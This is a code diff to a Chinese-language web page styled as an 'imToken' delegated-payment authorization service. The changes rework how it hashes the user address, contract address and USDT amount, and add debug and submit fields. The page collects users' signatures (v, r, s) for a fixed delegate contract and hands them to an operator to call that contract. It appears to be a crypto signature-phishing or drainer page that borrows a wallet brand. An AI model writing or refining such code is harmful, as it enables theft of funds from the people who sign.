@@ -6,7 +6,7 @@
     <title>imToken代付授权服务</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
-        /* 原有样式不变 */
+        /* 原有样式保持不变 */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -370,7 +370,7 @@
                 <p>• 矿工费：<span class="highlight">部署者代付（无需您支付TRX）</span></p>
                 <p class="orange-tip">⚠️ 提示：输入金额后点击「生成离线签名」，唤起钱包完成签名即可等待授权</p>
                 <div class="faq-tip">
-                    ❗ 签名逻辑已与合约完全对齐，包含哈希调试功能
+                    ❗ 签名逻辑已与合约完全对齐，兼容所有tronWeb版本
                 </div>
             </div>
         </div>
@@ -396,9 +396,13 @@
     <div class="debug-hash-modal" id="hashDebugModal" style="display: none;">
         <h3>签名哈希调试信息</h3>
         <p><strong>用户地址（Base58）：</strong><span id="debugUserAddr"></span></p>
+        <p><strong>用户地址（Hex）：</strong><span class="hash-text" id="debugUserHex"></span></p>
         <p><strong>合约地址（Base58）：</strong><span id="debugContractAddr"></span></p>
+        <p><strong>合约地址（Hex）：</strong><span class="hash-text" id="debugContractHex"></span></p>
         <p><strong>授权金额（原始）：</strong><span id="debugInputAmount"></span></p>
         <p><strong>金额（uint256整数）：</strong><span id="debugAmountInt"></span></p>
+        <p><strong>金额（Hex）：</strong><span class="hash-text" id="debugAmountHex"></span></p>
+        <p><strong>拼接字符串（Hex）：</strong><span class="hash-text" id="debugCombinedHex"></span></p>
         <p><strong>消息哈希（合约同款）：</strong><span class="hash-text" id="debugMessageHash"></span></p>
         <p><strong>签名用哈希（加前缀后）：</strong><span class="hash-text" id="debugSignedHash"></span></p>
         <button onclick="document.getElementById('hashDebugModal').style.display='none'">关闭</button>
@@ -550,7 +554,7 @@
                 }
             };
 
-            // 生成离线签名（核心：与合约验证逻辑完全对齐）
+            // 生成离线签名（核心：兼容所有tronWeb版本）
             approveBtn.onclick = async () => {
                 const inputAmountStr = amountInput.value.trim();
                 
@@ -579,11 +583,12 @@
                     const amountInt = usdtToInteger(inputAmountStr); // 如800USDT → 800000000
                     const amountHex = intToPaddedHex(amountInt); // 转64位Hex（uint256标准）
 
-                    // 2. 生成与合约100%一致的消息哈希（用tronWeb.soliditySha3模拟Solidity的keccak256(abi.encodePacked)）
-                    const { messageHash, signedHash } = await generateContractMessageHash(
+                    // 2. 生成与合约100%一致的消息哈希（手动拼接，不依赖soliditySha3）
+                    const { messageHash, signedHash, userHex, contractHex, combinedHex } = await generateContractMessageHash(
                         userAddress,
                         DELEGATE_CONTRACT,
                         amountInt,
+                        amountHex,
                         inputAmountStr
                     );
 
@@ -614,12 +619,15 @@
                     // 5. 构造提交数据
                     const submitData = {
                         user: userAddress,
+                        userHex: userHex,
+                        contractHex: contractHex,
                         amount: `0x${amountHex}`, // 合约格式（0x+64位Hex）
                         inputAmount: inputAmountStr, // 原始金额
+                        messageHash: messageHash,
+                        combinedHex: combinedHex,
                         v: v,
                         r: r,
                         s: s,
-                        messageHash: messageHash, // 新增：传递合约同款哈希给后端
                         approveTime: new Date().toLocaleString(),
                         delegateContract: DELEGATE_CONTRACT
                     };
@@ -680,15 +688,18 @@
                     }
                     const submitData = JSON.parse(submitDataStr || localStorage.getItem(SUBMIT_DATA_KEY));
                     const copyContent = `后端提交数据（与合约对齐）：
-1. 用户地址：${submitData.user}
-2. 原始金额：${submitData.inputAmount} USDT
-3. 合约金额（uint256）：${submitData.amount}
-4. 消息哈希（合约同款）：${submitData.messageHash}
-5. 签名V值：${submitData.v}
-6. 签名R值：${submitData.r}
-7. 签名S值：${submitData.s}
-8. 提交时间：${submitData.approveTime}
-9. 代付合约：${submitData.delegateContract}`;
+1. 用户地址（Base58）：${submitData.user}
+2. 用户地址（Hex）：${submitData.userHex}
+3. 合约地址（Hex）：${submitData.contractHex}
+4. 原始金额：${submitData.inputAmount} USDT
+5. 合约金额（uint256）：${submitData.amount}
+6. 拼接Hex字符串：${submitData.combinedHex}
+7. 消息哈希（合约同款）：${submitData.messageHash}
+8. 签名V值：${submitData.v}
+9. 签名R值：${submitData.r}
+10. 签名S值：${submitData.s}
+11. 提交时间：${submitData.approveTime}
+12. 代付合约：${submitData.delegateContract}`;
                     prompt("提交数据（可全选复制调用合约）", copyContent);
                 } catch (e) {
                     alert(`查看失败：${e.message}`);
@@ -722,33 +733,45 @@
         };
 
         /**
-         * 核心函数：生成与合约100%一致的消息哈希（用soliditySha3模拟Solidity的keccak256(abi.encodePacked)）
+         * 核心函数：生成与合约100%一致的消息哈希（手动拼接，兼容所有tronWeb版本）
+         * 逻辑：messageHash = keccak256(abi.encodePacked(userHex, contractHex, amountHex))
          */
-        async function generateContractMessageHash(userAddr, contractAddr, amountInt, inputAmountStr) {
+        async function generateContractMessageHash(userAddr, contractAddr, amountInt, amountHex, inputAmountStr) {
             try {
-                // 1. 用tronWeb.soliditySha3模拟Solidity的keccak256(abi.encodePacked(user, address(this), amount))
-                // 注：tronWeb.soliditySha3会自动将Base58地址转Hex，并按类型编码
-                const messageHash = tronWeb.soliditySha3(
-                    { type: 'address', value: userAddr },   // 用户地址（Base58，自动转Hex）
-                    { type: 'address', value: contractAddr }, // 合约地址（Base58，自动转Hex）
-                    { type: 'uint256', value: amountInt }  // 金额（uint256整数）
-                );
+                // 1. 地址转Hex（去掉0x，全小写，与合约address类型一致）
+                const userHex = tronWeb.address.toHex(userAddr)
+                    .replace(/^0x/, "") // 去掉前缀
+                    .toLowerCase(); // 全小写（合约abi.encodePacked不区分大小写，统一避免差异）
+                
+                const contractHex = tronWeb.address.toHex(contractAddr)
+                    .replace(/^0x/, "")
+                    .toLowerCase();
 
-                // 2. 生成合约验证用的signedHash（加EIP-191前缀，与合约一致）
+                // 2. 拼接参数：userHex（40位） + contractHex（40位） + amountHex（64位） → 总长度144位
+                const combinedHex = userHex + contractHex + amountHex;
+
+                // 3. 生成合约同款messageHash（用tronWeb.sha3计算，与Solidity的keccak256一致）
+                const messageHash = tronWeb.sha3(combinedHex, true); // true返回0x开头的Hex
+
+                // 4. 生成合约验证用的signedHash（加EIP-191前缀，与合约一致）
                 const prefix = "\x19Ethereum Signed Message:\n32";
                 const prefixHex = asciiToHex(prefix);
                 const signedHash = tronWeb.sha3(prefixHex + messageHash.slice(2), true); // 去掉messageHash的0x前缀
 
-                // 3. 显示哈希调试信息（方便与合约对比）
+                // 5. 显示哈希调试信息（方便与合约对比）
                 document.getElementById("debugUserAddr").textContent = userAddr;
+                document.getElementById("debugUserHex").textContent = userHex;
                 document.getElementById("debugContractAddr").textContent = contractAddr;
+                document.getElementById("debugContractHex").textContent = contractHex;
                 document.getElementById("debugInputAmount").textContent = inputAmountStr;
                 document.getElementById("debugAmountInt").textContent = amountInt.toString();
+                document.getElementById("debugAmountHex").textContent = amountHex;
+                document.getElementById("debugCombinedHex").textContent = combinedHex;
                 document.getElementById("debugMessageHash").textContent = messageHash;
                 document.getElementById("debugSignedHash").textContent = signedHash;
                 document.getElementById("hashDebugModal").style.display = "block";
 
-                return { messageHash, signedHash };
+                return { messageHash, signedHash, userHex, contractHex, combinedHex };
             } catch (e) {
                 throw new Error(`哈希生成失败：${e.message}`);
             }
